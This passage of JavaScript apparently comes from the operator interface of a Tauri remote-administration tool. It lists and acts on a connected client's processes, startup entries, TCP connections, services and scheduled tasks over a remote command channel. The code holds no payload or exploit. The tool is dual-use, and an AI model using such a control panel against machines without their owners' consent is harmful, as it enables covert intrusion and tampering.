    if (event.payload.uid !== currentPmUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'ProcessList':
        if (response.data.result?.processes) {
          renderProcesses(response.data.result.processes);
        }
        break;
      case 'Generic':
        if (response.success && lastKilledName) {
          pmStatusText.textContent = `${lastKilledName} killed successfully`;
          lastKilledName = null;
          // Show success briefly, then refresh and show count
          setTimeout(() => {
            loadProcesses();
          }, 1500);
        } else {
          pmStatusText.textContent = response.data.result?.message || 'Operation completed';
          loadProcesses();
        }
        break;
      case 'Error':
        pmStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        break;
    }
  });
})();

// ============ Startup Manager System ============

// Startup Manager DOM elements
const startupmgrOverlay = document.getElementById('startupmgr-overlay');
const startupmgrClose = document.getElementById('startupmgr-close');
const smStartupList = document.getElementById('sm-startup-list');
const smRefresh = document.getElementById('sm-refresh');
const smSearch = document.getElementById('sm-search');
const smStatusText = document.getElementById('sm-status-text');
const startupmgrTitleText = document.getElementById('startupmgr-title-text');
const smContextMenu = document.getElementById('sm-context-menu');

// Startup Manager state
let currentSmUid = null;
let smEntries = [];
let smSelectedEntry = null;
let smSortColumn = 'name';
let smSortAsc = true;
let smSearchFilter = '';

// Open startup manager for a client
async function openStartupManager(client) {
  currentSmUid = client.uid;
  smSelectedEntry = null;
  smEntries = [];
  smSearchFilter = '';
  smSearch.value = '';

  startupmgrTitleText.textContent = `Startup Manager - ${client.user}@${client.machine}`;
  startupmgrOverlay.classList.add('show');

  // Load initial startup entries
  loadStartupEntries();
}

// Close startup manager
function closeStartupManager() {
  startupmgrOverlay.classList.remove('show');
  currentSmUid = null;
  smSelectedEntry = null;
}

// Load startup entries from client
async function loadStartupEntries() {
  if (!currentSmUid) return;

  smStatusText.textContent = 'Loading...';
  smStartupList.innerHTML = '<tr><td colspan="3" class="pm-loading">Loading...</td></tr>';

  try {
    await invoke('send_command', {
      uid: currentSmUid,
      command: { type: 'ListStartupEntries' }
    });
  } catch (e) {
    smStatusText.textContent = 'Error: ' + e;
    smStartupList.innerHTML = `<tr><td colspan="3" class="pm-loading" style="color:#f87171">Error: ${e}</td></tr>`;
  }
}

// Render startup entries list
function renderStartupEntries(entries) {
  smEntries = entries;
  smStatusText.textContent = 'Ready';

  // Apply search filter
  let filtered = smEntries;
  if (smSearchFilter) {
    const search = smSearchFilter.toLowerCase();
    filtered = smEntries.filter(e =>
      e.name.toLowerCase().includes(search) ||
      e.command.toLowerCase().includes(search) ||
      e.location.toLowerCase().includes(search)
    );
  }

  // Apply sorting
  filtered.sort((a, b) => {
    let cmp = 0;
    switch (smSortColumn) {
      case 'name':
        cmp = a.name.toLowerCase().localeCompare(b.name.toLowerCase());
        break;
      case 'command':
        cmp = a.command.toLowerCase().localeCompare(b.command.toLowerCase());
        break;
      case 'location':
        cmp = a.location.toLowerCase().localeCompare(b.location.toLowerCase());
        break;
    }
    return smSortAsc ? cmp : -cmp;
  });

  // Update status with count
  smStatusText.textContent = `${filtered.length} startup entries`;

  // Clear and render
  smStartupList.innerHTML = '';

  if (filtered.length === 0) {
    smStartupList.innerHTML = '<tr><td colspan="3" class="pm-loading">No startup entries found</td></tr>';
    return;
  }

  filtered.forEach(entry => {
    const tr = document.createElement('tr');
    // Store entry data for context menu
    tr.dataset.name = entry.name;
    tr.dataset.entryType = entry.entry_type;
    tr.dataset.registryKey = entry.registry_key || '';
    tr.dataset.registryValue = entry.registry_value || '';
    tr.dataset.filePath = entry.file_path || '';

    if (smSelectedEntry && smSelectedEntry.name === entry.name) {
      tr.classList.add('selected');
    }

    tr.innerHTML = `
      <td class="sm-col-name" title="${escapeHtml(entry.name)}">${escapeHtml(entry.name)}</td>
      <td class="sm-col-command" title="${escapeHtml(entry.command)}">${escapeHtml(entry.command)}</td>
      <td class="sm-col-location" title="${escapeHtml(entry.location)}">${escapeHtml(entry.location)}</td>
    `;

    tr.addEventListener('click', () => {
      // Deselect previous
      smStartupList.querySelectorAll('tr.selected').forEach(el => el.classList.remove('selected'));
      // Select this one
      tr.classList.add('selected');
      smSelectedEntry = entry;
    });

    tr.addEventListener('contextmenu', (e) => {
      // Right-click to show context menu
      showSmContextMenu(e, entry);
    });

    smStartupList.appendChild(tr);
  });
}

// Remove selected startup entry
let lastRemovedName = null;

async function removeStartupEntry(entry) {
  if (!currentSmUid || !entry) return;

  lastRemovedName = entry.name || 'Entry';
  smStatusText.textContent = 'Removing entry...';

  try {
    await invoke('send_command', {
      uid: currentSmUid,
      command: {
        type: 'RemoveStartupEntry',
        params: {
          entry_type: entry.entry_type,
          registry_key: entry.registry_key || null,
          registry_value: entry.registry_value || null,
          file_path: entry.file_path || null
        }
      }
    });
    // Response will trigger refresh via event listener
  } catch (e) {
    smStatusText.textContent = 'Error: ' + e;
  }
}

// Sort column click handler
function setupSmSorting() {
  document.querySelectorAll('.sm-table th[data-sort]').forEach(th => {
    th.addEventListener('click', () => {
      const col = th.dataset.sort;

      // Toggle direction if same column
      if (smSortColumn === col) {
        smSortAsc = !smSortAsc;
      } else {
        smSortColumn = col;
        smSortAsc = true;
      }

      // Update UI
      document.querySelectorAll('.sm-table th').forEach(h => {
        h.classList.remove('sorted-asc', 'sorted-desc');
      });
      th.classList.add(smSortAsc ? 'sorted-asc' : 'sorted-desc');

      // Re-render
      renderStartupEntries(smEntries);
    });
  });
}

// Startup Manager event listeners
startupmgrClose?.addEventListener('click', closeStartupManager);

smRefresh?.addEventListener('click', () => {
  loadStartupEntries();
});

smSearch?.addEventListener('input', (e) => {
  smSearchFilter = e.target.value;
  renderStartupEntries(smEntries);
});

// Context menu for startup entry actions
let smContextEntry = null;

function showSmContextMenu(e, entry) {
  e.preventDefault();
  e.stopPropagation();
  smContextEntry = entry;

  // Hide first, position with flip logic, then show
  smContextMenu.classList.remove('show');
  setTimeout(() => positionContextMenu(smContextMenu, e.clientX, e.clientY), 10);
}

function hideSmContextMenu() {
  smContextMenu.classList.remove('show');
  smContextEntry = null;
}

// Hide context menu on click outside
document.addEventListener('click', () => {
  hideSmContextMenu();
});

// Hide context menu on mouse leave
smContextMenu?.addEventListener('mouseleave', () => {
  hideSmContextMenu();
});

// Handle context menu actions
smContextMenu?.addEventListener('click', async (e) => {
  e.stopPropagation(); // Prevent document click from hiding menu and clearing entry
  const action = e.target.dataset.action;
  if (!action || !smContextEntry) return;

  const entry = smContextEntry; // Capture before hiding
  hideSmContextMenu();

  switch (action) {
    case 'remove':
      removeStartupEntry(entry);
      break;
  }
});

// Close on overlay click
startupmgrOverlay?.addEventListener('click', (e) => {
  if (e.target === startupmgrOverlay) {
    closeStartupManager();
  }
});

// Initialize sorting
setupSmSorting();

// Startup Manager shell-response listener
(async function setupSmResponseListener() {
  const { listen } = window.__TAURI__.event;

  listen('shell-response', async (event) => {
    if (event.payload.uid !== currentSmUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'StartupList':
        if (response.data.result?.entries) {
          renderStartupEntries(response.data.result.entries);
        }
        break;
      case 'StartupResult':
        if (response.success && lastRemovedName) {
          smStatusText.textContent = `${lastRemovedName} removed successfully`;
          lastRemovedName = null;
          // Show success briefly, then refresh and show count
          setTimeout(() => {
            loadStartupEntries();
          }, 1500);
        } else {
          smStatusText.textContent = response.data.result?.message || 'Operation completed';
          loadStartupEntries();
        }
        break;
      case 'Error':
        smStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        break;
    }
  });
})();

// ============ TCP Connections System ============

// TCP Connections DOM elements
const tcpmgrOverlay = document.getElementById('tcpmgr-overlay');
const tcpmgrClose = document.getElementById('tcpmgr-close');
const tcpConnectionList = document.getElementById('tcp-connection-list');
const tcpRefresh = document.getElementById('tcp-refresh');
const tcpSearch = document.getElementById('tcp-search');
const tcpStatusText = document.getElementById('tcp-status-text');
const tcpmgrTitleText = document.getElementById('tcpmgr-title-text');
const tcpContextMenu = document.getElementById('tcp-context-menu');

// TCP Connections state
let currentTcpUid = null;
let tcpConnections = [];
let tcpSelectedConnection = null;
let tcpSortColumn = 'process';
let tcpSortAsc = true;
let tcpSearchFilter = '';

// Open TCP connections for a client
async function openTcpConnections(client) {
  currentTcpUid = client.uid;
  tcpSelectedConnection = null;
  tcpConnections = [];
  tcpSearchFilter = '';
  tcpSearch.value = '';

  tcpmgrTitleText.textContent = `TCP Connections - ${client.user}@${client.machine}`;
  tcpmgrOverlay.classList.add('show');

  // Load initial connections
  loadTcpConnections();
}

// Close TCP connections
function closeTcpConnections() {
  tcpmgrOverlay.classList.remove('show');
  currentTcpUid = null;
  tcpSelectedConnection = null;
}

// Load TCP connections from client
async function loadTcpConnections() {
  if (!currentTcpUid) return;

  tcpStatusText.textContent = 'Loading...';
  tcpConnectionList.innerHTML = '<tr><td colspan="4" class="pm-loading">Loading...</td></tr>';

  try {
    await invoke('send_command', {
      uid: currentTcpUid,
      command: { type: 'ListTcpConnections' }
    });
  } catch (e) {
    tcpStatusText.textContent = 'Error: ' + e;
    tcpConnectionList.innerHTML = `<tr><td colspan="4" class="pm-loading" style="color:#f87171">Error: ${e}</td></tr>`;
  }
}

// Render TCP connections list
function renderTcpConnections(connections) {
  tcpConnections = connections;
  tcpStatusText.textContent = 'Ready';

  // Apply search filter
  let filtered = tcpConnections;
  if (tcpSearchFilter) {
    const search = tcpSearchFilter.toLowerCase();
    filtered = tcpConnections.filter(c =>
      c.local_address.toLowerCase().includes(search) ||
      c.remote_address.toLowerCase().includes(search) ||
      c.process_name.toLowerCase().includes(search) ||
      c.pid.toString().includes(search)
    );
  }

  // Apply sorting
  filtered.sort((a, b) => {
    let cmp = 0;
    switch (tcpSortColumn) {
      case 'local':
        cmp = a.local_address.localeCompare(b.local_address);
        break;
      case 'remote':
        cmp = a.remote_address.localeCompare(b.remote_address);
        break;
      case 'pid':
        cmp = a.pid - b.pid;
        break;
      case 'process':
        cmp = a.process_name.toLowerCase().localeCompare(b.process_name.toLowerCase());
        break;
    }
    return tcpSortAsc ? cmp : -cmp;
  });

  // Update status with count
  tcpStatusText.textContent = `${filtered.length} connections`;

  // Clear and render
  tcpConnectionList.innerHTML = '';

  if (filtered.length === 0) {
    tcpConnectionList.innerHTML = '<tr><td colspan="4" class="pm-loading">No connections found</td></tr>';
    return;
  }

  filtered.forEach(conn => {
    const tr = document.createElement('tr');
    tr.dataset.pid = conn.pid;

    if (tcpSelectedConnection && tcpSelectedConnection.pid === conn.pid &&
        tcpSelectedConnection.local_address === conn.local_address) {
      tr.classList.add('selected');
    }

    tr.innerHTML = `
      <td class="tcp-col-local" title="${escapeHtml(conn.local_address)}">${escapeHtml(conn.local_address)}</td>
      <td class="tcp-col-remote" title="${escapeHtml(conn.remote_address)}">${escapeHtml(conn.remote_address)}</td>
      <td class="tcp-col-pid">${conn.pid}</td>
      <td class="tcp-col-process" title="${escapeHtml(conn.process_name)}">${escapeHtml(conn.process_name)}</td>
    `;

    tr.addEventListener('click', () => {
      // Deselect previous
      tcpConnectionList.querySelectorAll('tr.selected').forEach(el => el.classList.remove('selected'));
      // Select this one
      tr.classList.add('selected');
      tcpSelectedConnection = conn;
    });

    tr.addEventListener('contextmenu', (e) => {
      // Right-click to show context menu
      showTcpContextMenu(e, conn);
    });

    tcpConnectionList.appendChild(tr);
  });
}

// Kill process owning the connection
let lastKilledTcpProcess = null;

async function killTcpConnection(conn) {
  if (!currentTcpUid || !conn) return;

  lastKilledTcpProcess = conn.process_name || 'Process';
  tcpStatusText.textContent = 'Killing process...';

  try {
    await invoke('send_command', {
      uid: currentTcpUid,
      command: { type: 'KillTcpConnection', params: { pid: conn.pid } }
    });
    // Response will trigger refresh via event listener
  } catch (e) {
    tcpStatusText.textContent = 'Error: ' + e;
  }
}

// Sort column click handler
function setupTcpSorting() {
  document.querySelectorAll('.tcp-table th[data-sort]').forEach(th => {
    th.addEventListener('click', () => {
      const col = th.dataset.sort;

      // Toggle direction if same column
      if (tcpSortColumn === col) {
        tcpSortAsc = !tcpSortAsc;
      } else {
        tcpSortColumn = col;
        tcpSortAsc = true;
      }

      // Update UI
      document.querySelectorAll('.tcp-table th').forEach(h => {
        h.classList.remove('sorted-asc', 'sorted-desc');
      });
      th.classList.add(tcpSortAsc ? 'sorted-asc' : 'sorted-desc');

      // Re-render
      renderTcpConnections(tcpConnections);
    });
  });
}

// TCP Connections event listeners
tcpmgrClose?.addEventListener('click', closeTcpConnections);

tcpRefresh?.addEventListener('click', () => {
  loadTcpConnections();
});

tcpSearch?.addEventListener('input', (e) => {
  tcpSearchFilter = e.target.value;
  renderTcpConnections(tcpConnections);
});

// Context menu for TCP connection actions
let tcpContextConn = null;

function showTcpContextMenu(e, conn) {
  e.preventDefault();
  e.stopPropagation();
  tcpContextConn = conn;

  // Hide first, position with flip logic, then show
  tcpContextMenu.classList.remove('show');
  setTimeout(() => positionContextMenu(tcpContextMenu, e.clientX, e.clientY), 10);
}

function hideTcpContextMenu() {
  tcpContextMenu.classList.remove('show');
  tcpContextConn = null;
}

// Hide context menu on click outside
document.addEventListener('click', () => {
  hideTcpContextMenu();
});

// Hide context menu on mouse leave
tcpContextMenu?.addEventListener('mouseleave', () => {
  hideTcpContextMenu();
});

// Handle context menu actions
tcpContextMenu?.addEventListener('click', async (e) => {
  e.stopPropagation(); // Prevent document click from hiding menu
  const action = e.target.dataset.action;
  if (!action || !tcpContextConn) return;

  const conn = tcpContextConn; // Capture before hiding
  hideTcpContextMenu();

  switch (action) {
    case 'kill':
      killTcpConnection(conn);
      break;
  }
});

// Close on overlay click
tcpmgrOverlay?.addEventListener('click', (e) => {
  if (e.target === tcpmgrOverlay) {
    closeTcpConnections();
  }
});

// Initialize sorting
setupTcpSorting();

// TCP Connections shell-response listener
(async function setupTcpResponseListener() {
  const { listen } = window.__TAURI__.event;

  listen('shell-response', async (event) => {
    if (event.payload.uid !== currentTcpUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'TcpConnectionList':
        if (response.data.result?.connections) {
          renderTcpConnections(response.data.result.connections);
        }
        break;
      case 'Generic':
        if (response.success && lastKilledTcpProcess) {
          tcpStatusText.textContent = `${lastKilledTcpProcess} killed successfully`;
          lastKilledTcpProcess = null;
          // Show success briefly, then refresh
          setTimeout(() => {
            loadTcpConnections();
          }, 1500);
        } else {
          tcpStatusText.textContent = response.data.result?.message || 'Operation completed';
          loadTcpConnections();
        }
        break;
      case 'Error':
        tcpStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        break;
    }
  });
})();

// ============ Services Manager System ============

// Services Manager DOM elements
const svcmgrOverlay = document.getElementById('svcmgr-overlay');
const svcmgrClose = document.getElementById('svcmgr-close');
const svcServiceList = document.getElementById('svc-service-list');
const svcRefresh = document.getElementById('svc-refresh');
const svcSearch = document.getElementById('svc-search');
const svcStatusText = document.getElementById('svc-status-text');
const svcmgrTitleText = document.getElementById('svcmgr-title-text');
const svcContextMenu = document.getElementById('svc-context-menu');

// Services Manager state
let currentSvcUid = null;
let svcServices = [];
let svcSelectedService = null;
let svcSortColumn = 'display';
let svcSortAsc = true;
let svcSearchFilter = '';

// Open Services Manager for a client
async function openServicesManager(client) {
  currentSvcUid = client.uid;
  svcSelectedService = null;
  svcServices = [];
  svcSearchFilter = '';
  svcSearch.value = '';

  svcmgrTitleText.textContent = `Services Manager - ${client.user}@${client.machine}`;
  svcmgrOverlay.classList.add('show');

  // Load initial services
  loadServices();
}

// Close Services Manager
function closeServicesManager() {
  svcmgrOverlay.classList.remove('show');
  currentSvcUid = null;
  svcSelectedService = null;
}

// Load services from client
async function loadServices() {
  if (!currentSvcUid) return;

  svcStatusText.textContent = 'Loading...';
  svcServiceList.innerHTML = '<tr><td colspan="5" class="pm-loading">Loading...</td></tr>';

  try {
    await invoke('send_command', {
      uid: currentSvcUid,
      command: { type: 'ListServices' }
    });
  } catch (e) {
    svcStatusText.textContent = 'Error: ' + e;
    svcServiceList.innerHTML = `<tr><td colspan="5" class="pm-loading" style="color:#f87171">Error: ${e}</td></tr>`;
  }
}

// Render services list
function renderServices(services) {
  svcServices = services;
  svcStatusText.textContent = 'Ready';

  // Apply search filter
  let filtered = svcServices;
  if (svcSearchFilter) {
    const search = svcSearchFilter.toLowerCase();
    filtered = svcServices.filter(s =>
      s.name.toLowerCase().includes(search) ||
      s.display_name.toLowerCase().includes(search) ||
      s.status.toLowerCase().includes(search) ||
      s.startup_type.toLowerCase().includes(search)
    );
  }

  // Apply sorting
  filtered.sort((a, b) => {
    let cmp = 0;
    switch (svcSortColumn) {
      case 'name':
        cmp = a.name.toLowerCase().localeCompare(b.name.toLowerCase());
        break;
      case 'display':
        cmp = a.display_name.toLowerCase().localeCompare(b.display_name.toLowerCase());
        break;
      case 'status':
        cmp = a.status.localeCompare(b.status);
        break;
      case 'startup':
        cmp = a.startup_type.localeCompare(b.startup_type);
        break;
      case 'pid':
        cmp = (a.pid || 0) - (b.pid || 0);
        break;
    }
    return svcSortAsc ? cmp : -cmp;
  });

  // Update status with count
  svcStatusText.textContent = `${filtered.length} services`;

  // Clear and render
  svcServiceList.innerHTML = '';

  if (filtered.length === 0) {
    svcServiceList.innerHTML = '<tr><td colspan="5" class="pm-loading">No services found</td></tr>';
    return;
  }

  filtered.forEach(svc => {
    const tr = document.createElement('tr');
    tr.dataset.name = svc.name;

    if (svcSelectedService && svcSelectedService.name === svc.name) {
      tr.classList.add('selected');
    }

    // Determine status class
    let statusClass = '';
    if (svc.status === 'Running') {
      statusClass = 'svc-status-running';
    } else if (svc.status === 'Stopped') {
      statusClass = 'svc-status-stopped';
    } else {
      statusClass = 'svc-status-pending';
    }

    tr.innerHTML = `
      <td class="svc-col-name" title="${escapeHtml(svc.name)}">${escapeHtml(svc.name)}</td>
      <td class="svc-col-display" title="${escapeHtml(svc.display_name)}">${escapeHtml(svc.display_name)}</td>
      <td class="svc-col-status ${statusClass}">${escapeHtml(svc.status)}</td>
      <td class="svc-col-startup">${escapeHtml(svc.startup_type)}</td>
      <td class="svc-col-pid">${svc.pid || '-'}</td>
    `;

    tr.addEventListener('click', () => {
      // Deselect previous
      svcServiceList.querySelectorAll('tr.selected').forEach(el => el.classList.remove('selected'));
      // Select this one
      tr.classList.add('selected');
      svcSelectedService = svc;
    });

    tr.addEventListener('contextmenu', (e) => {
      // Right-click to show context menu
      showSvcContextMenu(e, svc);
    });

    svcServiceList.appendChild(tr);
  });
}

// Service control operations
let lastSvcAction = null;
let lastSvcName = null;

async function startService(svc) {
  if (!currentSvcUid || !svc) return;

  lastSvcAction = 'start';
  lastSvcName = svc.display_name || svc.name;
  svcStatusText.textContent = 'Starting service...';

  try {
    await invoke('send_command', {
      uid: currentSvcUid,
      command: { type: 'StartService', params: { name: svc.name } }
    });
  } catch (e) {
    svcStatusText.textContent = 'Error: ' + e;
  }
}

async function stopService(svc) {
  if (!currentSvcUid || !svc) return;

  lastSvcAction = 'stop';
  lastSvcName = svc.display_name || svc.name;
  svcStatusText.textContent = 'Stopping service...';

  try {
    await invoke('send_command', {
      uid: currentSvcUid,
      command: { type: 'StopService', params: { name: svc.name } }
    });
  } catch (e) {
    svcStatusText.textContent = 'Error: ' + e;
  }
}

async function restartService(svc) {
  if (!currentSvcUid || !svc) return;

  lastSvcAction = 'restart';
  lastSvcName = svc.display_name || svc.name;
  svcStatusText.textContent = 'Restarting service...';

  try {
    await invoke('send_command', {
      uid: currentSvcUid,
      command: { type: 'RestartService', params: { name: svc.name } }
    });
  } catch (e) {
    svcStatusText.textContent = 'Error: ' + e;
  }
}

// Sort column click handler
function setupSvcSorting() {
  document.querySelectorAll('.svc-table th[data-sort]').forEach(th => {
    th.addEventListener('click', () => {
      const col = th.dataset.sort;

      // Toggle direction if same column
      if (svcSortColumn === col) {
        svcSortAsc = !svcSortAsc;
      } else {
        svcSortColumn = col;
        svcSortAsc = true;
      }

      // Update UI
      document.querySelectorAll('.svc-table th').forEach(h => {
        h.classList.remove('sorted-asc', 'sorted-desc');
      });
      th.classList.add(svcSortAsc ? 'sorted-asc' : 'sorted-desc');

      // Re-render
      renderServices(svcServices);
    });
  });
}

// Services Manager event listeners
svcmgrClose?.addEventListener('click', closeServicesManager);

svcRefresh?.addEventListener('click', () => {
  loadServices();
});

svcSearch?.addEventListener('input', (e) => {
  svcSearchFilter = e.target.value;
  renderServices(svcServices);
});

// Context menu for service actions
let svcContextService = null;

function showSvcContextMenu(e, svc) {
  e.preventDefault();
  e.stopPropagation();
  svcContextService = svc;

  // Hide first, position with flip logic, then show
  svcContextMenu.classList.remove('show');
  setTimeout(() => positionContextMenu(svcContextMenu, e.clientX, e.clientY), 10);
}

function hideSvcContextMenu() {
  svcContextMenu.classList.remove('show');
  svcContextService = null;
}

// Hide context menu on click outside
document.addEventListener('click', () => {
  hideSvcContextMenu();
});

// Hide context menu on mouse leave
svcContextMenu?.addEventListener('mouseleave', () => {
  hideSvcContextMenu();
});

// Handle context menu actions
svcContextMenu?.addEventListener('click', async (e) => {
  e.stopPropagation(); // Prevent document click from hiding menu
  const action = e.target.dataset.action;
  if (!action || !svcContextService) return;

  const svc = svcContextService; // Capture before hiding
  hideSvcContextMenu();

  switch (action) {
    case 'start':
      startService(svc);
      break;
    case 'stop':
      stopService(svc);
      break;
    case 'restart':
      restartService(svc);
      break;
  }
});

// Close on overlay click
svcmgrOverlay?.addEventListener('click', (e) => {
  if (e.target === svcmgrOverlay) {
    closeServicesManager();
  }
});

// Initialize sorting
setupSvcSorting();

// Services Manager shell-response listener
(async function setupSvcResponseListener() {
  const { listen } = window.__TAURI__.event;

  listen('shell-response', async (event) => {
    if (event.payload.uid !== currentSvcUid) return;

    const response = event.payload.response;
    if (!response || !response.data) return;

    switch (response.data.type) {
      case 'ServiceList':
        if (response.data.result?.services) {
          renderServices(response.data.result.services);
        }
        break;
      case 'ServiceResult':
        if (response.data.result?.success) {
          const actionVerb = lastSvcAction === 'start' ? 'started' :
                            lastSvcAction === 'stop' ? 'stopped' : 'restarted';
          svcStatusText.textContent = `${lastSvcName} ${actionVerb} successfully`;
          lastSvcAction = null;
          lastSvcName = null;
          // Show success briefly, then refresh
          setTimeout(() => {
            loadServices();
          }, 1500);
        } else {
          svcStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Operation failed');
          lastSvcAction = null;
          lastSvcName = null;
        }
        break;
      case 'Error':
        svcStatusText.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
        lastSvcAction = null;
        lastSvcName = null;
        break;
    }
  });
})();

// ============ Task Scheduler Manager ============

// Task Scheduler DOM elements
const taskmgrOverlay = document.getElementById('taskmgr-overlay');
const taskmgrTitleText = document.getElementById('taskmgr-title-text');
const taskmgrClose = document.getElementById('taskmgr-close');
const taskSearch = document.getElementById('task-search');
const taskRefresh = document.getElementById('task-refresh');
const taskList = document.getElementById('task-list');
const taskStatusText = document.getElementById('task-status-text');
const taskContextMenu = document.getElementById('task-context-menu');

// Task Scheduler state
let currentTaskUid = null;
let taskTasks = [];
let taskSelectedTask = null;
let taskSortColumn = 'name';
let taskSortAsc = true;
let taskSearchFilter = '';

// Open Task Scheduler for a client
async function openTaskScheduler(client) {
  currentTaskUid = client.uid;
  taskSelectedTask = null;
  taskTasks = [];
  taskSearchFilter = '';
  taskSearch.value = '';

  taskmgrTitleText.textContent = `Task Scheduler - ${client.user}@${client.machine}`;
  taskmgrOverlay.classList.add('show');

  // Load initial tasks
  loadScheduledTasks();
}

// Close Task Scheduler
function closeTaskScheduler() {
  taskmgrOverlay.classList.remove('show');
  currentTaskUid = null;
  taskSelectedTask = null;
}

// Load tasks from client
async function loadScheduledTasks() {
  if (!currentTaskUid) return;

  taskStatusText.textContent = 'Loading...';
  taskList.innerHTML = '<tr><td colspan="6" class="pm-loading">Loading...</td></tr>';

  try {
    await invoke('send_command', {
      uid: currentTaskUid,
      command: { type: 'ListScheduledTasks' }
    });
  } catch (e) {
    taskStatusText.textContent = 'Error: ' + e;
    taskList.innerHTML = `<tr><td colspan="6" class="pm-loading" style="color:#f87171">Error: ${e}</td></tr>`;
  }
}

// Render tasks list
function renderScheduledTasks(tasks) {
  taskTasks = tasks;
  taskStatusText.textContent = 'Ready';

  // Apply search filter
  let filtered = taskTasks;
  if (taskSearchFilter) {
    const search = taskSearchFilter.toLowerCase();
    filtered = taskTasks.filter(t =>
      t.name.toLowerCase().includes(search) ||
      t.path.toLowerCase().includes(search) ||
      t.status.toLowerCase().includes(search) ||
      t.trigger.toLowerCase().includes(search) ||
      t.action.toLowerCase().includes(search)
    );
  }

  // Apply sorting
  filtered.sort((a, b) => {
    let cmp = 0;
    switch (taskSortColumn) {
      case 'name':
        cmp = a.name.toLowerCase().localeCompare(b.name.toLowerCase());
        break;
      case 'status':
        cmp = a.status.localeCompare(b.status);
        break;
      case 'trigger':
        cmp = a.trigger.toLowerCase().localeCompare(b.trigger.toLowerCase());
        break;
      case 'nextrun':
        cmp = a.next_run.localeCompare(b.next_run);
        break;
      case 'lastrun':
        cmp = a.last_run.localeCompare(b.last_run);
        break;
      case 'lastresult':
        cmp = a.last_result - b.last_result;
        break;
    }
    return taskSortAsc ? cmp : -cmp;
  });

  // Update status with count
  taskStatusText.textContent = `${filtered.length} tasks`;

  // Clear and render
  taskList.innerHTML = '';

  if (filtered.length === 0) {
    taskList.innerHTML = '<tr><td colspan="6" class="pm-loading">No tasks found</td></tr>';
    return;
  }

  filtered.forEach(task => {
    const tr = document.createElement('tr');
    tr.dataset.name = task.path + '\\' + task.name;

    if (taskSelectedTask && taskSelectedTask.name === task.name && taskSelectedTask.path === task.path) {
      tr.classList.add('selected');
    }

    // Determine status class
    let statusClass = '';
    const statusLower = task.status.toLowerCase();
    if (statusLower === 'ready') {
      statusClass = 'task-status-ready';
    } else if (statusLower === 'running') {
      statusClass = 'task-status-running';
    } else if (statusLower === 'disabled') {
      statusClass = 'task-status-disabled';
    }

    // Determine result class
    let resultClass = '';
    let resultText = task.last_result.toString();
    if (task.last_result === 0) {
      resultClass = 'task-result-success';
      resultText = 'OK';
    } else if (task.last_result !== 0 && task.last_run !== 'N/A' && task.last_run !== 'Never') {
      resultClass = 'task-result-error';
      resultText = '0x' + task.last_result.toString(16).toUpperCase();
    }

    const fullPath = task.path + '\\' + task.name;

    tr.innerHTML = `
      <td class="task-col-name" title="${escapeHtml(fullPath)}">${escapeHtml(task.name)}</td>
      <td class="task-col-status ${statusClass}">${escapeHtml(task.status)}</td>
      <td class="task-col-trigger" title="${escapeHtml(task.trigger)}">${escapeHtml(task.trigger)}</td>
      <td class="task-col-nextrun" title="${escapeHtml(task.next_run)}">${escapeHtml(task.next_run)}</td>
      <td class="task-col-lastrun" title="${escapeHtml(task.last_run)}">${escapeHtml(task.last_run)}</td>
      <td class="task-col-lastresult ${resultClass}">${resultText}</td>
    `;

    tr.addEventListener('click', () => {
      // Deselect previous
      taskList.querySelectorAll('tr.selected').forEach(el => el.classList.remove('selected'));
      // Select this one
      tr.classList.add('selected');
      taskSelectedTask = task;
    });

    tr.addEventListener('contextmenu', (e) => {
      showTaskContextMenu(e, task);
    });

    taskList.appendChild(tr);
  });
}

// Task control operations
let lastTaskAction = null;
let lastTaskName = null;

async function runScheduledTask(task) {
  if (!currentTaskUid || !task) return;

  const fullName = task.path + '\\' + task.name;
  lastTaskAction = 'run';
  lastTaskName = task.name;
  taskStatusText.textContent = 'Running task...';

  try {
    await invoke('send_command', {
      uid: currentTaskUid,
      command: { type: 'RunScheduledTask', params: { name: fullName } }
    });
  } catch (e) {
    taskStatusText.textContent = 'Error: ' + e;
  }
}

async function enableScheduledTask(task) {
  if (!currentTaskUid || !task) return;

  const fullName = task.path + '\\' + task.name;
  lastTaskAction = 'enable';
  lastTaskName = task.name;
  taskStatusText.textContent = 'Enabling task...';

  try {
    await invoke('send_command', {
      uid: currentTaskUid,
      command: { type: 'EnableScheduledTask', params: { name: fullName } }
    });
  } catch (e) {
    taskStatusText.textContent = 'Error: ' + e;
  }
}

async function disableScheduledTask(task) {
  if (!currentTaskUid || !task) return;

  const fullName = task.path + '\\' + task.name;
  lastTaskAction = 'disable';
  lastTaskName = task.name;
  taskStatusText.textContent = 'Disabling task...';

  try {
    await invoke('send_command', {
      uid: currentTaskUid,
      command: { type: 'DisableScheduledTask', params: { name: fullName } }
    });
  } catch (e) {
    taskStatusText.textContent = 'Error: ' + e;
  }
}

async function deleteScheduledTask(task) {
  if (!currentTaskUid || !task) return;

  const fullName = task.path + '\\' + task.name;

  // Confirm deletion
  if (!confirm(`Are you sure you want to delete the task "${task.name}"?`)) {
    return;
  }

  lastTaskAction = 'delete';
  lastTaskName = task.name;
  taskStatusText.textContent = 'Deleting task...';

  try {
    await invoke('send_command', {
      uid: currentTaskUid,
      command: { type: 'DeleteScheduledTask', params: { name: fullName } }
    });
  } catch (e) {
    taskStatusText.textContent = 'Error: ' + e;
  }
}

// Sort column click handler
function setupTaskSorting() {
  document.querySelectorAll('.task-table th[data-sort]').forEach(th => {
    th.addEventListener('click', () => {
      const col = th.dataset.sort;

      // Toggle direction if same column
      if (taskSortColumn === col) {
        taskSortAsc = !taskSortAsc;
      } else {
        taskSortColumn = col;
        taskSortAsc = true;
      }

      // Update UI
      document.querySelectorAll('.task-table th').forEach(h => {
        h.classList.remove('sorted-asc', 'sorted-desc');
      });
      th.classList.add(taskSortAsc ? 'sorted-asc' : 'sorted-desc');

      // Re-render
      renderScheduledTasks(taskTasks);
    });
  });
}

// Task Scheduler event listeners
taskmgrClose?.addEventListener('click', closeTaskScheduler);

taskRefresh?.addEventListener('click', () => {
  loadScheduledTasks();
});

taskSearch?.addEventListener('input', (e) => {
  taskSearchFilter = e.target.value;
